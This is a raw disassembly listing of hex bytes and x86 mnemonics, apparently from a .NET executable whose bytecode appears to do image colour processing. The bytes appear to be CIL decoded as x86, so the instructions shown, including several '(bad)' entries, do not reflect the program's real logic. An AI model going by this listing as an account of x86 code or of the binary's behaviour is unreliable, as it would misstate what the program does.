  402592:	a3 01 00 00 1b       	mov    %eax,0x1b000001
  402597:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402598:	01 00                	add    %eax,(%eax)
  40259a:	00 1b                	add    %bl,(%ebx)
  40259c:	03 07                	add    (%edi),%eax
  40259e:	08 a4 01 00 00 1b 06 	or     %ah,0x61b0000(%ecx,%eax,1)
  4025a5:	17                   	pop    %ss
  4025a6:	30 d2                	xor    %dl,%dl
  4025a8:	2a 00                	sub    (%eax),%al
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	13 30                	adc    (%eax),%esi
  4025ae:	05 00 c1 00 00       	add    $0xc100,%eax
  4025b3:	00 08                	add    %cl,(%eax)
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	11 02                	adc    %eax,(%edx)
  4025b9:	18 28                	sbb    %ch,(%eax)
  4025bb:	0e                   	push   %cs
  4025bc:	00 00                	add    %al,(%eax)
  4025be:	06                   	push   %es
  4025bf:	03 39                	add    (%ecx),%edi
  4025c1:	b3 00                	mov    $0x0,%bl
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	03 6c 23 00          	add    0x0(%ebx,%eiz,1),%ebp
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	00 00                	add    %al,(%eax)
  4025cd:	80 66 40 5b          	andb   $0x5b,0x40(%esi)
  4025d1:	23 4a d8             	and    -0x28(%edx),%ecx
  4025d4:	12 4d fb             	adc    -0x5(%ebp),%cl
  4025d7:	21 09                	and    %ecx,(%ecx)
  4025d9:	40                   	inc    %eax
  4025da:	5a                   	pop    %edx
  4025db:	0b 12                	or     (%edx),%edx
  4025dd:	00 07                	add    %al,(%edi)
  4025df:	28 3b                	sub    %bh,(%ebx)
  4025e1:	00 00                	add    %al,(%eax)
  4025e3:	0a 6b 7d             	or     0x7d(%ebx),%ch
  4025e6:	4f                   	dec    %edi
  4025e7:	00 00                	add    %al,(%eax)
  4025e9:	04 12                	add    $0x12,%al
  4025eb:	00 07                	add    %al,(%edi)
  4025ed:	28 3d 00 00 0a 6b    	sub    %bh,0x6b0a0000
  4025f3:	7d 50                	jge    0x402645
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	04 12                	add    $0x12,%al
  4025f9:	00 07                	add    %al,(%edi)
  4025fb:	28 3d 00 00 0a 65    	sub    %bh,0x650a0000
  402601:	6b 7d 51 00          	imul   $0x0,0x51(%ebp),%edi
  402605:	00 04 12             	add    %al,(%edx,%edx,1)
  402608:	00 07                	add    %al,(%edi)
  40260a:	28 3b                	sub    %bh,(%ebx)
  40260c:	00 00                	add    %al,(%eax)
  40260e:	0a 6b 7d             	or     0x7d(%ebx),%ch
  402611:	52                   	push   %edx
  402612:	00 00                	add    %al,(%eax)
  402614:	04 12                	add    $0x12,%al
  402616:	00 04 7b             	add    %al,(%ebx,%edi,2)
  402619:	55                   	push   %ebp
  40261a:	00 00                	add    %al,(%eax)
  40261c:	04 6c                	add    $0x6c,%al
  40261e:	07                   	pop    %es
  40261f:	28 3b                	sub    %bh,(%ebx)
  402621:	00 00                	add    %al,(%eax)
  402623:	0a 04 7b             	or     (%ebx,%edi,2),%al
  402626:	55                   	push   %ebp
  402627:	00 00                	add    %al,(%eax)
  402629:	04 6c                	add    $0x6c,%al
  40262b:	5a                   	pop    %edx
  40262c:	59                   	pop    %ecx
  40262d:	07                   	pop    %es
  40262e:	28 3d 00 00 0a 04    	sub    %bh,0x40a0000
  402634:	7b 56                	jnp    0x40268c
  402636:	00 00                	add    %al,(%eax)
  402638:	04 6c                	add    $0x6c,%al
  40263a:	5a                   	pop    %edx
  40263b:	58                   	pop    %eax
  40263c:	6b 7d 53 00          	imul   $0x0,0x53(%ebp),%edi
  402640:	00 04 12             	add    %al,(%edx,%edx,1)
  402643:	00 04 7b             	add    %al,(%ebx,%edi,2)
  402646:	56                   	push   %esi
  402647:	00 00                	add    %al,(%eax)
  402649:	04 6c                	add    $0x6c,%al
  40264b:	07                   	pop    %es
  40264c:	28 3b                	sub    %bh,(%ebx)
  40264e:	00 00                	add    %al,(%eax)
  402650:	0a 04 7b             	or     (%ebx,%edi,2),%al
  402653:	56                   	push   %esi
  402654:	00 00                	add    %al,(%eax)
  402656:	04 6c                	add    $0x6c,%al
  402658:	5a                   	pop    %edx
  402659:	59                   	pop    %ecx
  40265a:	07                   	pop    %es
  40265b:	28 3d 00 00 0a 04    	sub    %bh,0x40a0000
  402661:	7b 55                	jnp    0x4026b8
  402663:	00 00                	add    %al,(%eax)
  402665:	04 6c                	add    $0x6c,%al
  402667:	5a                   	pop    %edx
  402668:	59                   	pop    %ecx
  402669:	6b 7d 54 00          	imul   $0x0,0x54(%ebp),%edi
  40266d:	00 04 02             	add    %al,(%edx,%eax,1)
  402670:	12 00                	adc    (%eax),%al
  402672:	28 0d 00 00 06 26    	sub    %cl,0x26060000
  402678:	2a 00                	sub    (%eax),%al
  40267a:	00 00                	add    %al,(%eax)
  40267c:	13 30                	adc    (%eax),%esi
  40267e:	05 00 92 01 00       	add    $0x19200,%eax
  402683:	00 09                	add    %cl,(%ecx)
  402685:	00 00                	add    %al,(%eax)
  402687:	11 02                	adc    %eax,(%edx)
  402689:	6f                   	outsl  %ds:(%esi),(%dx)
  40268a:	1d 00 00 0a 02       	sbb    $0x20a0000,%eax
  40268f:	6f                   	outsl  %ds:(%esi),(%dx)
  402690:	1e                   	push   %ds
  402691:	00 00                	add    %al,(%eax)
  402693:	0a 73 1f             	or     0x1f(%ebx),%dh
  402696:	00 00                	add    %al,(%eax)
  402698:	0a 0a                	or     (%edx),%cl
  40269a:	12 01                	adc    (%ecx),%al
  40269c:	16                   	push   %ss
  40269d:	16                   	push   %ss
  40269e:	02 6f 1d             	add    0x1d(%edi),%ch
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	0a 02                	or     (%edx),%al
  4026a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a6:	1e                   	push   %ds
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	0a 28                	or     (%eax),%ch
  4026ab:	22 00                	and    (%eax),%al
  4026ad:	00 0a                	add    %cl,(%edx)
  4026af:	02 07                	add    (%edi),%al
  4026b1:	17                   	pop    %ss
  4026b2:	02 6f 42             	add    0x42(%edi),%ch
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	0a 6f 33             	or     0x33(%edi),%ch
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4026bf:	07                   	pop    %es
  4026c0:	18 06                	sbb    %al,(%esi)
  4026c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c3:	42                   	inc    %edx
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	0a 6f 33             	or     0x33(%edi),%ch
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	0a 0d 02 6f 42 00    	or     0x426f02,%cl
  4026d1:	00 0a                	add    %cl,(%edx)
  4026d3:	28 43 00             	sub    %al,0x0(%ebx)
  4026d6:	00 0a                	add    %cl,(%edx)
  4026d8:	1e                   	push   %ds
  4026d9:	5b                   	pop    %ebx
  4026da:	13 04 08             	adc    (%eax,%ecx,1),%eax
  4026dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4026de:	36 00 00             	add    %al,%ss:(%eax)
  4026e1:	0a 13                	or     (%ebx),%dl
  4026e3:	05 09 6f 36 00       	add    $0x366f09,%eax
  4026e8:	00 0a                	add    %cl,(%edx)
  4026ea:	13 06                	adc    (%esi),%eax
  4026ec:	11 05 02 6f 1e 00    	adc    %eax,0x1e6f02
  4026f2:	00 0a                	add    %cl,(%edx)
  4026f4:	5a                   	pop    %edx
  4026f5:	8d 42 00             	lea    0x0(%edx),%eax
  4026f8:	00 01                	add    %al,(%ecx)
  4026fa:	13 07                	adc    (%edi),%eax
  4026fc:	11 06                	adc    %eax,(%esi)
  4026fe:	02 6f 1e             	add    0x1e(%edi),%ch
  402701:	00 00                	add    %al,(%eax)
  402703:	0a 5a 8d             	or     -0x73(%edx),%bl
  402706:	42                   	inc    %edx
  402707:	00 00                	add    %al,(%eax)
  402709:	01 13                	add    %edx,(%ebx)
  40270b:	08 08                	or     %cl,(%eax)
  40270d:	6f                   	outsl  %ds:(%esi),(%dx)
  40270e:	34 00                	xor    $0x0,%al
  402710:	00 0a                	add    %cl,(%edx)
  402712:	11 07                	adc    %eax,(%edi)
  402714:	16                   	push   %ss
  402715:	11 07                	adc    %eax,(%edi)
  402717:	8e 69 28             	mov    0x28(%ecx),%gs
  40271a:	44                   	inc    %esp
  40271b:	00 00                	add    %al,(%eax)
  40271d:	0a 16                	or     (%esi),%dl
  40271f:	13 09                	adc    (%ecx),%ecx
  402721:	38 c5                	cmp    %al,%ch
  402723:	00 00                	add    %al,(%eax)
  402725:	00 16                	add    %dl,(%esi)
  402727:	13 0a                	adc    (%edx),%ecx
  402729:	38 aa 00 00 00 11    	cmp    %ch,0x11000000(%edx)
  40272f:	09 11                	or     %edx,(%ecx)
  402731:	05 5a 11 0a 11       	add    $0x110a115a,%eax
  402736:	04 5a                	add    $0x5a,%al
  402738:	58                   	pop    %eax
  402739:	13 0b                	adc    (%ebx),%ecx
  40273b:	11 09                	adc    %ecx,(%ecx)
  40273d:	11 06                	adc    %eax,(%esi)
  40273f:	5a                   	pop    %edx
  402740:	11 0a                	adc    %ecx,(%edx)
  402742:	11 04 5a             	adc    %eax,(%edx,%ebx,2)
  402745:	58                   	pop    %eax
  402746:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  402749:	07                   	pop    %es
  40274a:	11 0b                	adc    %ecx,(%ebx)
  40274c:	19 58 91             	sbb    %ebx,-0x6f(%eax)
  40274f:	11 07                	adc    %eax,(%edi)
  402751:	11 0b                	adc    %ecx,(%ebx)
  402753:	18 58 91             	sbb    %bl,-0x6f(%eax)
  402756:	11 07                	adc    %eax,(%edi)
  402758:	11 0b                	adc    %ecx,(%ebx)
  40275a:	17                   	pop    %ss
  40275b:	58                   	pop    %eax
  40275c:	91                   	xchg   %eax,%ecx
  40275d:	11 07                	adc    %eax,(%edi)
  40275f:	11 0b                	adc    %ecx,(%ebx)
  402761:	91                   	xchg   %eax,%ecx
  402762:	28 45 00             	sub    %al,0x0(%ebp)
  402765:	00 0a                	add    %cl,(%edx)
  402767:	13 0d 12 0d 28 46    	adc    0x46280d12,%ecx
  40276d:	00 00                	add    %al,(%eax)
  40276f:	0a 13                	or     (%ebx),%dl
  402771:	0e                   	push   %cs
  402772:	11 0e                	adc    %ecx,(%esi)
  402774:	03 58 13             	add    0x13(%eax),%ebx
  402777:	0e                   	push   %cs
  402778:	11 0e                	adc    %ecx,(%esi)
  40277a:	22 00                	and    (%eax),%al
  40277c:	00 b4 43 5d 13 0e 12 	add    %dh,0x120e135d(%ebx,%eax,2)
  402783:	0d 28 47 00 00       	or     $0x4728,%eax
  402788:	0a 11                	or     (%ecx),%dl
  40278a:	0e                   	push   %cs
  40278b:	22 00                	and    (%eax),%al
  40278d:	00 80 3f 22 00 00    	add    %al,0x223f(%eax)
  402793:	00 3f                	add    %bh,(%edi)
  402795:	28 10                	sub    %dl,(%eax)
  402797:	00 00                	add    %al,(%eax)
  402799:	06                   	push   %es
  40279a:	13 0f                	adc    (%edi),%ecx
  40279c:	11 08                	adc    %ecx,(%eax)
  40279e:	11 0c 19             	adc    %ecx,(%ecx,%ebx,1)
  4027a1:	58                   	pop    %eax
  4027a2:	12 0f                	adc    (%edi),%cl
  4027a4:	28 47 00             	sub    %al,0x0(%edi)
  4027a7:	00 0a                	add    %cl,(%edx)
  4027a9:	9c                   	pushf
  4027aa:	11 08                	adc    %ecx,(%eax)
  4027ac:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
  4027af:	58                   	pop    %eax
  4027b0:	12 0f                	adc    (%edi),%cl
  4027b2:	28 48 00             	sub    %cl,0x0(%eax)
  4027b5:	00 0a                	add    %cl,(%edx)
  4027b7:	9c                   	pushf
  4027b8:	11 08                	adc    %ecx,(%eax)
  4027ba:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4027bd:	58                   	pop    %eax
  4027be:	12 0f                	adc    (%edi),%cl
  4027c0:	28 49 00             	sub    %cl,0x0(%ecx)
  4027c3:	00 0a                	add    %cl,(%edx)
  4027c5:	9c                   	pushf
  4027c6:	11 08                	adc    %ecx,(%eax)
  4027c8:	11 0c 12             	adc    %ecx,(%edx,%edx,1)
  4027cb:	0f 28 4a 00          	movaps 0x0(%edx),%xmm1
  4027cf:	00 0a                	add    %cl,(%edx)
  4027d1:	9c                   	pushf
  4027d2:	11 0a                	adc    %ecx,(%edx)
  4027d4:	17                   	pop    %ss
  4027d5:	58                   	pop    %eax
  4027d6:	13 0a                	adc    (%edx),%ecx
  4027d8:	11 0a                	adc    %ecx,(%edx)
  4027da:	02 6f 1d             	add    0x1d(%edi),%ch
  4027dd:	00 00                	add    %al,(%eax)
  4027df:	0a 3f                	or     (%edi),%bh
  4027e1:	49                   	dec    %ecx
  4027e2:	ff                   	(bad)
  4027e3:	ff                   	(bad)
  4027e4:	ff 11                	call   *(%ecx)
  4027e6:	09 17                	or     %edx,(%edi)
  4027e8:	58                   	pop    %eax
  4027e9:	13 09                	adc    (%ecx),%ecx
  4027eb:	11 09                	adc    %ecx,(%ecx)
  4027ed:	02 6f 1e             	add    0x1e(%edi),%ch
  4027f0:	00 00                	add    %al,(%eax)
  4027f2:	0a 3f                	or     (%edi),%bh
  4027f4:	2e ff                	cs (bad)
  4027f6:	ff                   	(bad)
  4027f7:	ff 11                	call   *(%ecx)
  4027f9:	08 16                	or     %dl,(%esi)
  4027fb:	09 6f 34             	or     %ebp,0x34(%edi)
  4027fe:	00 00                	add    %al,(%eax)
  402800:	0a 11                	or     (%ecx),%dl
  402802:	08 8e 69 28 4b 00    	or     %cl,0x4b2869(%esi)
  402808:	00 0a                	add    %cl,(%edx)
  40280a:	02 08                	add    (%eax),%cl
  40280c:	6f                   	outsl  %ds:(%esi),(%dx)
  40280d:	3a 00                	cmp    (%eax),%al
  40280f:	00 0a                	add    %cl,(%edx)
  402811:	06                   	push   %es
  402812:	09 6f 3a             	or     %ebp,0x3a(%edi)
  402815:	00 00                	add    %al,(%eax)
  402817:	0a 06                	or     (%esi),%al
  402819:	2a 00                	sub    (%eax),%al
  40281b:	00 13                	add    %dl,(%ebx)
  40281d:	30 05 00 e7 01 00    	xor    %al,0x1e700
  402823:	00 0a                	add    %cl,(%edx)
  402825:	00 00                	add    %al,(%eax)
  402827:	11 16                	adc    %edx,(%esi)
  402829:	02 30                	add    (%eax),%dh
  40282b:	08 20                	or     %ah,(%eax)
  40282d:	ff 00                	incl   (%eax)
  40282f:	00 00                	add    %al,(%eax)
  402831:	02 2f                	add    (%edi),%ch
  402833:	16                   	push   %ss
  402834:	72 01                	jb     0x402837
  402836:	00 00                	add    %al,(%eax)
  402838:	70 02                	jo     0x40283c
  40283a:	8c 48 00             	mov    %cs,0x0(%eax)
  40283d:	00 01                	add    %al,(%ecx)
  40283f:	72 0d                	jb     0x40284e
  402841:	00 00                	add    %al,(%eax)
  402843:	70 73                	jo     0x4028b8
  402845:	4c                   	dec    %esp
  402846:	00 00                	add    %al,(%eax)
  402848:	0a 7a 22             	or     0x22(%edx),%bh
  40284b:	00 00                	add    %al,(%eax)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	03 30                	add    (%eax),%esi
  402851:	08 22                	or     %ah,(%edx)
  402853:	00 00                	add    %al,(%eax)
  402855:	b4 43                	mov    $0x43,%ah
  402857:	03 34 16             	add    (%esi,%edx,1),%esi
  40285a:	72 5f                	jb     0x4028bb
  40285c:	00 00                	add    %al,(%eax)
  40285e:	70 03                	jo     0x402863
  402860:	8c 4a 00             	mov    %cs,0x0(%edx)
  402863:	00 01                	add    %al,(%ecx)
  402865:	72 67                	jb     0x4028ce
  402867:	00 00                	add    %al,(%eax)
  402869:	70 73                	jo     0x4028de
  40286b:	4c                   	dec    %esp
  40286c:	00 00                	add    %al,(%eax)
  40286e:	0a 7a 22             	or     0x22(%edx),%bh
  402871:	00 00                	add    %al,(%eax)
  402873:	00 00                	add    %al,(%eax)
  402875:	04 30                	add    $0x30,%al
  402877:	08 22                	or     %ah,(%edx)
  402879:	00 00                	add    %al,(%eax)
  40287b:	80 3f 04             	cmpb   $0x4,(%edi)
  40287e:	34 16                	xor    $0x16,%al
  402880:	72 b9                	jb     0x40283b
  402882:	00 00                	add    %al,(%eax)
  402884:	70 04                	jo     0x40288a
  402886:	8c 4a 00             	mov    %cs,0x0(%edx)
  402889:	00 01                	add    %al,(%ecx)
  40288b:	72 cf                	jb     0x40285c
  40288d:	00 00                	add    %al,(%eax)
  40288f:	70 73                	jo     0x402904
  402891:	4c                   	dec    %esp
  402892:	00 00                	add    %al,(%eax)
  402894:	0a 7a 22             	or     0x22(%edx),%bh
  402897:	00 00                	add    %al,(%eax)
  402899:	00 00                	add    %al,(%eax)
  40289b:	05 30 08 22 00       	add    $0x220830,%eax
  4028a0:	00 80 3f 05 34 16    	add    %al,0x1634053f(%eax)
  4028a6:	72 1d                	jb     0x4028c5
  4028a8:	01 00                	add    %eax,(%eax)
  4028aa:	70 05                	jo     0x4028b1
  4028ac:	8c 4a 00             	mov    %cs,0x0(%edx)
  4028af:	00 01                	add    %al,(%ecx)
  4028b1:	72 cf                	jb     0x402882
  4028b3:	00 00                	add    %al,(%eax)
  4028b5:	70 73                	jo     0x40292a
  4028b7:	4c                   	dec    %esp
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	0a 7a 22             	or     0x22(%edx),%bh
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	00 00                	add    %al,(%eax)
  4028c1:	04 33                	add    $0x33,%al
  4028c3:	2b 02                	sub    (%edx),%eax
  4028c5:	05 22 00 00 7f       	add    $0x7f000022,%eax
  4028ca:	43                   	inc    %ebx
  4028cb:	5a                   	pop    %edx
  4028cc:	28 4d 00             	sub    %cl,0x0(%ebp)
  4028cf:	00 0a                	add    %cl,(%edx)
  4028d1:	05 22 00 00 7f       	add    $0x7f000022,%eax
  4028d6:	43                   	inc    %ebx
  4028d7:	5a                   	pop    %edx
  4028d8:	28 4d 00             	sub    %cl,0x0(%ebp)
  4028db:	00 0a                	add    %cl,(%edx)
  4028dd:	05 22 00 00 7f       	add    $0x7f000022,%eax
  4028e2:	43                   	inc    %ebx
  4028e3:	5a                   	pop    %edx
  4028e4:	28 4d 00             	sub    %cl,0x0(%ebp)
  4028e7:	00 0a                	add    %cl,(%edx)
  4028e9:	28 45 00             	sub    %al,0x0(%ebp)
  4028ec:	00 0a                	add    %cl,(%edx)
  4028ee:	2a 23                	sub    (%ebx),%ah
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	00 00                	add    %al,(%eax)
  4028f4:	00 00                	add    %al,(%eax)
  4028f6:	e0 3f                	loopne 0x402937
  4028f8:	05 6c 34 12 05       	add    $0x512346c,%eax
  4028fd:	05 04 5a 59 04       	add    $0x4595a04,%eax
  402902:	58                   	pop    %eax
  402903:	0a 05 05 04 5a 58    	or     0x585a0405,%al
  402909:	04 59                	add    $0x59,%al
  40290b:	0c 2b                	or     $0x2b,%al
  40290d:	0c 05                	or     $0x5,%al
  40290f:	05 04 5a 58 0a       	add    $0xa585a04,%eax
  402914:	05 05 04 5a 59       	add    $0x595a0405,%eax
  402919:	0c 03                	or     $0x3,%al
  40291b:	22 00                	and    (%eax),%al
  40291d:	00 70 42             	add    %dh,0x42(%eax)
  402920:	5b                   	pop    %ebx
  402921:	69 0d 22 00 00 96 43 	imul   $0x9350343,0x96000022,%ecx
  402928:	03 35 09 
  40292b:	03 22                	add    (%edx),%esp
  40292d:	00 00                	add    %al,(%eax)
  40292f:	b4 43                	mov    $0x43,%ah
  402931:	59                   	pop    %ecx
  402932:	10 01                	adc    %al,(%ecx)
  402934:	03 22                	add    (%edx),%esp
  402936:	00 00                	add    %al,(%eax)
  402938:	70 42                	jo     0x40297c
  40293a:	5b                   	pop    %ebx
  40293b:	10 01                	adc    %al,(%ecx)
  40293d:	03 22                	add    (%edx),%esp
  40293f:	00 00                	add    %al,(%eax)
  402941:	00 40 09             	add    %al,0x9(%eax)
  402944:	6b 22 00             	imul   $0x0,(%edx),%esp
  402947:	00 80 3f 58 22 00    	add    %al,0x22583f(%eax)
  40294d:	00 c0                	add    %al,%al
  40294f:	40                   	inc    %eax
  402950:	5d                   	pop    %ebp
  402951:	22 00                	and    (%eax),%al
  402953:	00 00                	add    %al,(%eax)
  402955:	40                   	inc    %eax
  402956:	5b                   	pop    %ebx
  402957:	6c                   	insb   (%dx),%es:(%edi)
  402958:	28 4e 00             	sub    %cl,0x0(%esi)
  40295b:	00 0a                	add    %cl,(%edx)
  40295d:	6b 5a 59 10          	imul   $0x10,0x59(%edx),%ebx
  402961:	01 09                	add    %ecx,(%ecx)
  402963:	18 5d 2d             	sbb    %bl,0x2d(%ebp)
  402966:	0a 03                	or     (%ebx),%al
  402968:	06                   	push   %es
  402969:	08 59 5a             	or     %bl,0x5a(%ecx)
  40296c:	08 58 0b             	or     %bl,0xb(%eax)
  40296f:	2b 08                	sub    (%eax),%ecx
  402971:	08 03                	or     %al,(%ebx)
  402973:	06                   	push   %es
  402974:	08 59 5a             	or     %bl,0x5a(%ecx)
  402977:	59                   	pop    %ecx
  402978:	0b 06                	or     (%esi),%eax
  40297a:	22 00                	and    (%eax),%al
  40297c:	00 7f 43             	add    %bh,0x43(%edi)
  40297f:	5a                   	pop    %edx
  402980:	28 4d 00             	sub    %cl,0x0(%ebp)
  402983:	00 0a                	add    %cl,(%edx)
  402985:	13 04 07             	adc    (%edi,%eax,1),%eax
  402988:	22 00                	and    (%eax),%al
  40298a:	00 7f 43             	add    %bh,0x43(%edi)
  40298d:	5a                   	pop    %edx
  40298e:	28 4d 00             	sub    %cl,0x0(%ebp)
  402991:	00 0a                	add    %cl,(%edx)
  402993:	13 05 08 22 00 00    	adc    0x2208,%eax
  402999:	7f 43                	jg     0x4029de
  40299b:	5a                   	pop    %edx
  40299c:	28 4d 00             	sub    %cl,0x0(%ebp)
  40299f:	00 0a                	add    %cl,(%edx)
  4029a1:	13 06                	adc    (%esi),%eax
  4029a3:	09 17                	or     %edx,(%edi)
  4029a5:	59                   	pop    %ecx
  4029a6:	45                   	inc    %ebp
  4029a7:	05 00 00 00 02       	add    $0x2000000,%eax
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	00 0f                	add    %cl,(%edi)
  4029b0:	00 00                	add    %al,(%eax)
  4029b2:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	29 00                	sub    %eax,(%eax)
  4029b9:	00 00                	add    %al,(%eax)
  4029bb:	36 00 00             	add    %al,%ss:(%eax)
  4029be:	00 2b                	add    %ch,(%ebx)
  4029c0:	41                   	inc    %ecx
  4029c1:	02 11                	add    (%ecx),%dl
  4029c3:	05 11 04 11 06       	add    $0x6110411,%eax
  4029c8:	28 45 00             	sub    %al,0x0(%ebp)
  4029cb:	00 0a                	add    %cl,(%edx)
  4029cd:	2a 02                	sub    (%edx),%al
  4029cf:	11 06                	adc    %eax,(%esi)
  4029d1:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4029d4:	05 28 45 00 00       	add    $0x4528,%eax
  4029d9:	0a 2a                	or     (%edx),%ch
  4029db:	02 11                	add    (%ecx),%dl
  4029dd:	06                   	push   %es
  4029de:	11 05 11 04 28 45    	adc    %eax,0x45280411
  4029e4:	00 00                	add    %al,(%eax)
  4029e6:	0a 2a                	or     (%edx),%ch
  4029e8:	02 11                	add    (%ecx),%dl
  4029ea:	05 11 06 11 04       	add    $0x4110611,%eax
  4029ef:	28 45 00             	sub    %al,0x0(%ebp)
  4029f2:	00 0a                	add    %cl,(%edx)
  4029f4:	2a 02                	sub    (%edx),%al
  4029f6:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4029f9:	06                   	push   %es
  4029fa:	11 05 28 45 00 00    	adc    %eax,0x4528
  402a00:	0a 2a                	or     (%edx),%ch
  402a02:	02 11                	add    (%ecx),%dl
  402a04:	04 11                	add    $0x11,%al
  402a06:	05 11 06 28 45       	add    $0x45280611,%eax
  402a0b:	00 00                	add    %al,(%eax)
  402a0d:	0a 2a                	or     (%edx),%ch
  402a0f:	00 13                	add    %dl,(%ebx)
  402a11:	30 05 00 0d 01 00    	xor    %al,0x10d00
  402a17:	00 0b                	add    %cl,(%ebx)
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	11 02                	adc    %eax,(%edx)
  402a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1e:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
  402a23:	02 6f 1e             	add    0x1e(%edi),%ch
  402a26:	00 00                	add    %al,(%eax)
  402a28:	0a 0b                	or     (%ebx),%cl
  402a2a:	06                   	push   %es
  402a2b:	07                   	pop    %es
  402a2c:	73 1f                	jae    0x402a4d
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	0a 0c 02             	or     (%edx,%eax,1),%cl
  402a33:	16                   	push   %ss
  402a34:	16                   	push   %ss
  402a35:	06                   	push   %es
  402a36:	07                   	pop    %es
  402a37:	73 22                	jae    0x402a5b
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	0a 17                	or     (%edi),%dl
  402a3d:	20 0a                	and    %cl,(%edx)
  402a3f:	20 26                	and    %ah,(%esi)
  402a41:	00 6f 33             	add    %ch,0x33(%edi)
  402a44:	00 00                	add    %al,(%eax)
  402a46:	0a 0d 08 16 16 06    	or     0x6161608,%cl
  402a4c:	07                   	pop    %es
  402a4d:	73 22                	jae    0x402a71
  402a4f:	00 00                	add    %al,(%eax)
  402a51:	0a 18                	or     (%eax),%bl
  402a53:	20 0a                	and    %cl,(%edx)
  402a55:	20 26                	and    %ah,(%esi)
  402a57:	00 6f 33             	add    %ch,0x33(%edi)
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	0a 13                	or     (%ebx),%dl
  402a5e:	04 09                	add    $0x9,%al
  402a60:	6f                   	outsl  %ds:(%esi),(%dx)
  402a61:	34 00                	xor    $0x0,%al
  402a63:	00 0a                	add    %cl,(%edx)
  402a65:	28 4f 00             	sub    %cl,0x0(%edi)
  402a68:	00 0a                	add    %cl,(%edx)
  402a6a:	13 05 11 04 6f 34    	adc    0x346f0411,%eax
  402a70:	00 00                	add    %al,(%eax)
  402a72:	0a 28                	or     (%eax),%ch
  402a74:	4f                   	dec    %edi
  402a75:	00 00                	add    %al,(%eax)
  402a77:	0a 13                	or     (%ebx),%dl
  402a79:	06                   	push   %es
  402a7a:	16                   	push   %ss
  402a7b:	13 07                	adc    (%edi),%eax
  402a7d:	38 8e 00 00 00 16    	cmp    %cl,0x16000000(%esi)
  402a83:	13 08                	adc    (%eax),%ecx
  402a85:	2b 5f 11             	sub    0x11(%edi),%ebx
  402a88:	05 47 13 09 11       	add    $0x11091347,%eax
  402a8d:	05 17 58 47 13       	add    $0x13475817,%eax
  402a92:	0a 11                	or     (%ecx),%dl
  402a94:	05 18 58 47 11       	add    $0x11475818,%eax
  402a99:	0a 11                	or     (%ecx),%dl
  402a9b:	09 28                	or     %ebp,(%eax)
  402a9d:	12 00                	adc    (%eax),%al
  402a9f:	00 06                	add    %al,(%esi)
  402aa1:	28 13                	sub    %dl,(%ebx)
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	06                   	push   %es
  402aa6:	13 0b                	adc    (%ebx),%ecx
  402aa8:	11 06                	adc    %eax,(%esi)
  402aaa:	12 0b                	adc    (%ebx),%cl
  402aac:	28 4a 00             	sub    %cl,0x0(%edx)
  402aaf:	00 0a                	add    %cl,(%edx)
  402ab1:	52                   	push   %edx
  402ab2:	11 06                	adc    %eax,(%esi)
  402ab4:	17                   	pop    %ss
  402ab5:	58                   	pop    %eax
  402ab6:	12 0b                	adc    (%ebx),%cl
  402ab8:	28 49 00             	sub    %cl,0x0(%ecx)
  402abb:	00 0a                	add    %cl,(%edx)
  402abd:	52                   	push   %edx
  402abe:	11 06                	adc    %eax,(%esi)
  402ac0:	18 58 12             	sbb    %bl,0x12(%eax)
  402ac3:	0b 28                	or     (%eax),%ebp
  402ac5:	48                   	dec    %eax
  402ac6:	00 00                	add    %al,(%eax)
  402ac8:	0a 52 11             	or     0x11(%edx),%dl
  402acb:	06                   	push   %es
  402acc:	19 58 11             	sbb    %ebx,0x11(%eax)
  402acf:	05 19 58 47 52       	add    $0x52475819,%eax
  402ad4:	11 05 1a 58 13 05    	adc    %eax,0x513581a
  402ada:	11 06                	adc    %eax,(%esi)
  402adc:	1a 58 13             	sbb    0x13(%eax),%bl
  402adf:	06                   	push   %es
  402ae0:	11 08                	adc    %ecx,(%eax)
  402ae2:	17                   	pop    %ss
  402ae3:	58                   	pop    %eax
  402ae4:	13 08                	adc    (%eax),%ecx
  402ae6:	11 08                	adc    %ecx,(%eax)
  402ae8:	06                   	push   %es
  402ae9:	32 9c 11 05 09 6f 36 	xor    0x366f0905(%ecx,%edx,1),%bl
  402af0:	00 00                	add    %al,(%eax)
  402af2:	0a 06                	or     (%esi),%al
  402af4:	1a 5a 59             	sbb    0x59(%edx),%bl
  402af7:	58                   	pop    %eax
  402af8:	13 05 11 06 11 04    	adc    0x4110611,%eax
  402afe:	6f                   	outsl  %ds:(%esi),(%dx)
  402aff:	36 00 00             	add    %al,%ss:(%eax)
  402b02:	0a 06                	or     (%esi),%al
  402b04:	1a 5a 59             	sbb    0x59(%edx),%bl
  402b07:	58                   	pop    %eax
  402b08:	13 06                	adc    (%esi),%eax
  402b0a:	11 07                	adc    %eax,(%edi)
  402b0c:	17                   	pop    %ss
